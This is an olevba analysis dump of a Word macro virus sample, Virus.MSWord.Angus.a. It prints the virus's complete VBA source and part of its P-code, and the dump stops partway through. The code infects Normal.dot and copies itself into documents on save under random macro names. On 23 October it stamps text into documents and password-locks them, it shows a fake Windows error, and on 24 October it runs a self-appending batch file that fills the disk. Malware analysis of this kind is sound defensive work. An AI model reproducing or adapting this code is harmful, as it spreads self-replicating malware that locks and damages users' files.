olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Angus.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NHukjbnBp.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/NHukjbnBp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Function pn$()
Dim count_
Dim ab
Dim cd
Dim ss
Dim sP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 5) + 5)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)

  ss = Rnd()
  If ss < 0.5 Then
      sP$ = sP$ + Chr(ab)
  Else
      sP$ = sP$ + Chr(cd)
  End If
Next count_
pn$ = sP$

End Function
-------------------------------------------------------------------------------
VBA MACRO uyrGYO.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/uyrGYO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Function pas$()
Dim count_
Dim ab
Dim cd
Dim ef
Dim xx
Dim xP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 9) + 9)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)
  ef = WordBasic.Int(Rnd() * (57 - 48) + 48)
  
  xx = Rnd()
  If xx < 0.35 Then
      xP$ = xP$ + Chr(ab)
  ElseIf (xx > 0.34) And (xx < 0.68) Then
      xP$ = xP$ + Chr(cd)
  Else
      xP$ = xP$ + Chr(ef)
  End If
Next count_
pas$ = xP$

End Function



Private Function pn$()
Dim count_
Dim ab
Dim cd
Dim ss
Dim sP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 5) + 5)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)

  ss = Rnd()
  If ss < 0.5 Then
      sP$ = sP$ + Chr(ab)
  Else
      sP$ = sP$ + Chr(cd)
  End If
Next count_
pn$ = sP$

End Function
-------------------------------------------------------------------------------
VBA MACRO HhYekIELT.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/HhYekIELT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PoWNmLGYJg.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/PoWNmLGYJg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xMlOFIqU.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/xMlOFIqU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LxCLcEggG.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/LxCLcEggG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TMBoiC.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/TMBoiC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TAMqeiFVvX.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/TAMqeiFVvX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
'dull macro

'by NAENBGOURSG
'SO.HT.AI.KS
'231076 -- GREECE
'VRD 23-4-1997
'VRP A.U.A

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
On Error GoTo -1: On Error GoTo xxut
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="1"

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 0

 iMacroCount = WordBasic.CountMacros(0, 0)
 For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "PCGURU4" Then
        bInstalled = -1
    End If
 Next i
 If Not bInstalled Then
    WordBasic.MkDir WordBasic.[DefaultDir$](2) + "\PcGuru2"
    WordBasic.CopyFile FileName:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Directory:=WordBasic.[DefaultDir$](2) + "\PcGuru2"
SetAttr WordBasic.[DefaultDir$](2) + "\PcGuru2", 2


WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "NOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "FC"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 1"), "FileSave"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 2"), "FileSaveAs"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 3"), "FilePrint"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 4"), "FilePrintDefault"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "FileTemplates"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "ToolsMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 6"), "FileExit"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 7"), "PCGURU4"
    

    Open WordBasic.[DefaultDir$](2) + "\PcGuru4.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "Rem PcGuru4 virus by NAENBGOURSG"
    Print #1, "Rem Golden Version 4.3"
    Print #1, "type PcGuru4.bat >> PcGuru4.bat"
    Close 1
 
End If
'by NAENBGOURSG

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 1

xxut:
WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO xIFiXuSkkU.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/xIFiXuSkkU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ÁðïèÞêåõóç ôïõ åíåñãïý åããñÜöïõ Þ ðñïôýðïõ"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim F$
Dim h
Dim g
Dim T$
'by NAENBGOURSG
                  
On Error GoTo -1: On Error GoTo Z
F$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Format:=1

If WordBasic.[GetDocumentVar$]("M 4") <> "" Then
 For h = 1 To 7
  WordBasic.ToolsMacro Name:=WordBasic.[GetDocumentVar$]("M" + Str(h)), Delete:=1
 Next h
End If

For g = 1 To 7
WordBasic.SetDocumentVar "M" + Str(g), pn$
Next g

  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 1")
 WordBasic.MacroCopy "FileSave", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 2")
 WordBasic.MacroCopy "FileSaveAs", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 3")
 WordBasic.MacroCopy "FilePrint", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 4")
 WordBasic.MacroCopy "FilePrintDefault", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 5")
 WordBasic.MacroCopy "FileTemplates", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 6")
 WordBasic.MacroCopy "FileExit", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 7")
 WordBasic.MacroCopy "PCGURU4", T$, 1

 T$ = F$ + ":FileClose"
 WordBasic.MacroCopy "FC", T$, 1
  T$ = F$ + ":AutoOpen"
 WordBasic.MacroCopy "NOpen", T$, 1


WordBasic.FileSave
GoTo Q

Z:
WordBasic.FileSave

Q:

End Sub



Private Function pn$()
Dim count_
Dim ab
Dim cd
Dim ss
Dim sP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 5) + 5)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)

  ss = Rnd()
  If ss < 0.5 Then
      sP$ = sP$ + Chr(ab)
  Else
      sP$ = sP$ + Chr(cd)
  End If
Next count_
pn$ = sP$

End Function
-------------------------------------------------------------------------------
VBA MACRO FRHfJrPf.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/FRHfJrPf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ÁðïèÞêåõóç åíüò áíôéãñÜöïõ ôïõ åããñÜöïõ óå Üëëï ÷ùñéóôü áñ÷åßï"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim F$
Dim h
Dim g
Dim T$
Dim pswr$
'by NAENBGOURSG

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Z
F$ = WordBasic.[FileName$]()
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then
      dlg.Format = 1
End If

If WordBasic.[GetDocumentVar$]("M 4") <> "" Then
 For h = 1 To 7
  WordBasic.ToolsMacro Name:=WordBasic.[GetDocumentVar$]("M" + Str(h)), Delete:=1
 Next h
End If

For g = 1 To 7
WordBasic.SetDocumentVar "M" + Str(g), pn$
Next g

  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 1")
 WordBasic.MacroCopy "FileSave", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 2")
 WordBasic.MacroCopy "FileSaveAs", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 3")
 WordBasic.MacroCopy "FilePrint", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 4")
 WordBasic.MacroCopy "FilePrintDefault", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 5")
 WordBasic.MacroCopy "FileTemplates", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 6")
 WordBasic.MacroCopy "FileExit", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 7")
 WordBasic.MacroCopy "PCGURU4", T$, 1

  T$ = F$ + ":FileClose"
 WordBasic.MacroCopy "FC", T$, 1
  T$ = F$ + ":AutoOpen"
 WordBasic.MacroCopy "NOpen", T$, 1

If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 10 And WordBasic.Hour(WordBasic.Now()) = 12 And WordBasic.Minute(WordBasic.Now()) > 30 Then
pswr$ = pas$
dlg.Password = pswr$
WordBasic.SetProfileString "PCGURU", WordBasic.[FileName$]() + Str(WordBasic.Minute(WordBasic.Now())) + Str(WordBasic.Second(WordBasic.Now())), pswr$ + "NAENBGOURSG"
End If

WordBasic.FileSaveAs dlg
GoTo Q

Z:
 If Err.Number <> 102 Then
  WordBasic.FileSaveAs dlg
 End If
Q:

End Sub



Private Function pas$()
Dim count_
Dim ab
Dim cd
Dim ef
Dim xx
Dim xP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 9) + 9)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)
  ef = WordBasic.Int(Rnd() * (57 - 48) + 48)
  
  xx = Rnd()
  If xx < 0.35 Then
      xP$ = xP$ + Chr(ab)
  ElseIf (xx > 0.34) And (xx < 0.68) Then
      xP$ = xP$ + Chr(cd)
  Else
      xP$ = xP$ + Chr(ef)
  End If
Next count_
pas$ = xP$

End Function



Private Function pn$()
Dim count_
Dim ab
Dim cd
Dim ss
Dim sP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 5) + 5)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)

  ss = Rnd()
  If ss < 0.5 Then
      sP$ = sP$ + Chr(ab)
  Else
      sP$ = sP$ + Chr(cd)
  End If
Next count_
pn$ = sP$

End Function
-------------------------------------------------------------------------------
VBA MACRO BLbNs.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/BLbNs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Åêôýðùóç ôïõ åíåñãïý åããñÜöïõ"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrint.MAIN"
Dim i
'by NAENBGOURSG

If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 10 Then
    WordBasic.ScreenUpdating 0
    WordBasic.EndOfDocument
    For i = 15 To 24
       WordBasic.FontSize i
       WordBasic.Bold
       WordBasic.InsertPara
       WordBasic.Insert "NAENBGOURSG"
    Next i
    WordBasic.InsertPara
    WordBasic.Insert "Hello from GREECE"
    WordBasic.StartOfDocument
    WordBasic.SetProfileString "PCGURU", "Print", "1"
End If

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
WordBasic.CurValues.FilePrint dlg
WordBasic.Dialog.FilePrint dlg
WordBasic.FilePrint dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO WPKuKkD.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/WPKuKkD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Åêôýðùóç ôïõ åíåñãïý åããñÜöïõ ìå ôéò ðñïåðéëåãìÝíåò ðáñáìÝôñïõò åêôýðùóçò"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrintDefault.MAIN"
Dim i
'by NAENBGOURSG

If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 10 Then
    WordBasic.ScreenUpdating 0
    WordBasic.EndOfDocument
    For i = 15 To 24
       WordBasic.FontSize i
       WordBasic.Bold
       WordBasic.InsertPara
       WordBasic.Insert "NAENBGOURSG"
    Next i
    WordBasic.InsertPara
    WordBasic.Insert "Hello from GREECE"
    WordBasic.StartOfDocument
    WordBasic.SetProfileString "PCGURU", "Print", "1"
End If

WordBasic.FilePrintDefault
End Sub
-------------------------------------------------------------------------------
VBA MACRO EXYhm.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/EXYhm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ÁëëáãÞ ôïõ åíåñãïý ðñïôýðïõ êáé ôùí åðéëïãþí ôïõ"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
'by NAENBGOURSG
WordBasic.Beep
WordBasic.MsgBox "Windows Protection Error", "Microsoft Windows", 16
End Sub
-------------------------------------------------------------------------------
VBA MACRO WbRimiqV.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/WbRimiqV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "¸îïäïò áðü ôï Microsoft Word ìå åñþôçóç åðéâåâáßùóçò ãéá ôçí áðïèÞêåõóç ôùí åããñÜöùí"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
'by NAENBGOURSG

If WordBasic.Day(WordBasic.Now()) = 24 And WordBasic.Month(WordBasic.Now()) = 10 And WordBasic.[GetProfileString$]("PCGURU", "Print") <> "" Then
  WordBasic.ScreenUpdating 0
  WordBasic.ChDir WordBasic.[DefaultDir$](2)
  WordBasic.Shell "PCGURU4.BAT", 0
End If

If WordBasic.[FileName$]() <> "" Then
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
End If

WordBasic.FileExit
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Angus.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
On Error GoTo -1: On Error GoTo bail
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="1"

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 0

 iMacroCount = WordBasic.CountMacros(0, 0)
 For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "PCGURU4" Then
        bInstalled = -1
    End If
 Next i
 If Not bInstalled Then
    WordBasic.MkDir WordBasic.[DefaultDir$](2) + "\PcGuru2"
    WordBasic.CopyFile FileName:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Directory:=WordBasic.[DefaultDir$](2) + "\PcGuru2"
SetAttr WordBasic.[DefaultDir$](2) + "\PcGuru2", 2


WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "NOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "FC"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 1"), "FileSave"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 2"), "FileSaveAs"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 3"), "FilePrint"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 4"), "FilePrintDefault"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "FileTemplates"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "ToolsMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 6"), "FileExit"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 7"), "PCGURU4"
    

    Open WordBasic.[DefaultDir$](2) + "\PcGuru4.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "Rem PcGuru4 virus by NAENBGOURSG"
    Print #1, "Rem Golden Version 4.3"
    Print #1, "type PcGuru4.bat >> PcGuru4.bat"
    Close 1
 
End If
'by NAENBGOURSG

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 1

bail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Angus.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/NHukjbnBp - 3082 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Private Function pn())
' Line #4:
' 	Dim 
' 	VarDefn count_
' Line #5:
' 	Dim 
' 	VarDefn ab
' Line #6:
' 	Dim 
' 	VarDefn cd
' Line #7:
' 	Dim 
' 	VarDefn ss
' Line #8:
' 	Dim 
' 	VarDefn sP
' Line #9:
' Line #10:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000B 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0005 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	For 
' Line #11:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ab 
' Line #12:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St cd 
' Line #13:
' Line #14:
' 	ArgsLd Rnd 0x0000 
' 	St ss 
' Line #15:
' 	Ld ss 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #16:
' 	Ld sP$ 
' 	Ld ab 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #17:
' 	ElseBlock 
' Line #18:
' 	Ld sP$ 
' 	Ld cd 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld sP$ 
' 	St pn$ 
' Line #22:
' Line #23:
' 	EndFunc 
' Macros/VBA/uyrGYO - 4649 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Private Function pas())
' Line #4:
' 	Dim 
' 	VarDefn count_
' Line #5:
' 	Dim 
' 	VarDefn ab
' Line #6:
' 	Dim 
' 	VarDefn cd
' Line #7:
' 	Dim 
' 	VarDefn ef
' Line #8:
' 	Dim 
' 	VarDefn xx
' Line #9:
' 	Dim 
' 	VarDefn xP
' Line #10:
' Line #11:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000B 
' 	LitDI2 0x0009 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0009 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	For 
' Line #12:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ab 
' Line #13:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St cd 
' Line #14:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0039 
' 	LitDI2 0x0030 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0030 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ef 
' Line #15:
' Line #16:
' 	ArgsLd Rnd 0x0000 
' 	St xx 
' Line #17:
' 	Ld xx 
' 	LitR8 0x6666 0x6666 0x6666 0x3FD6 
' 	Lt 
' 	IfBlock 
' Line #18:
' 	Ld xP$ 
' 	Ld ab 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St xP$ 
' Line #19:
' 	Ld xx 
' 	LitR8 0xF5C3 0x5C28 0xC28F 0x3FD5 
' 	Gt 
' 	Paren 
' 	Ld xx 
' 	LitR8 0xF5C3 0x5C28 0xC28F 0x3FE5 
' 	Lt 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #20:
' 	Ld xP$ 
' 	Ld cd 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St xP$ 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	Ld xP$ 
' 	Ld ef 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St xP$ 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	Ld xP$ 
' 	St pas$ 
' Line #26:
' Line #27:
' 	EndFunc 
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' 	FuncDefn (Private Function pn())
' Line #32:
' 	Dim 
' 	VarDefn count_
' Line #33:
' 	Dim 
' 	VarDefn ab
' Line #34:
' 	Dim 
' 	VarDefn cd
' Line #35:
' 	Dim 
' 	VarDefn ss
' Line #36:
' 	Dim 
' 	VarDefn sP
' Line #37:
' Line #38:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000B 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0005 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	For 
' Line #39:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ab 
' Line #40:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St cd 
' Line #41:
' Line #42:
' 	ArgsLd Rnd 0x0000 
' 	St ss 
' Line #43:
' 	Ld ss 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #44:
' 	Ld sP$ 
' 	Ld ab 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	Ld sP$ 
' 	Ld cd 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St sP$ 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Ld count_ 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	Ld sP$ 
' 	St pn$ 
' Line #50:
' Line #51:
' 	EndFunc 
' Macros/VBA/HhYekIELT - 1440 bytes
' Macros/VBA/PoWNmLGYJg - 1377 bytes
' Macros/VBA/xMlOFIqU - 1055 bytes
' Macros/VBA/LxCLcEggG - 1256 bytes
' Macros/VBA/TMBoiC - 980 bytes
' Macros/VBA/TAMqeiFVvX - 1151 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	QuoteRem 0x0000 0x000A "dull macro"
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x000E "by NAENBGOURSG"
' Line #6:
' 	QuoteRem 0x0000 0x000B "SO.HT.AI.KS"
' Line #7:
' 	QuoteRem 0x0000 0x0010 "231076 -- GREECE"
' Line #8:
' 	QuoteRem 0x0000 0x000D "VRD 23-4-1997"
' Line #9:
' 	QuoteRem 0x0000 0x0009 "VRP A.U.A"
' Line #10:
' Line #11:
' 	EndSub 
' Macros/VBA/FileClose - 3548 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn iMacroCount
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn bInstalled
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError xxut 
' Line #6:
' 	LitDI2 0x0001 
' 	ParamNamed FastSaves 
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	LitDI2 0x0001 
' 	ParamNamed AutoSave 
' 	LitStr 0x0001 "1"
' 	ParamNamed SaveInterval 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0004 
' Line #7:
' Line #8:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\Normal.dot"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #9:
' Line #10:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #12:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0007 "PCGURU4"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitDI2 0x0001 
' 	UMi 
' 	St bInstalled 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' 	Ld bInstalled 
' 	Not 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
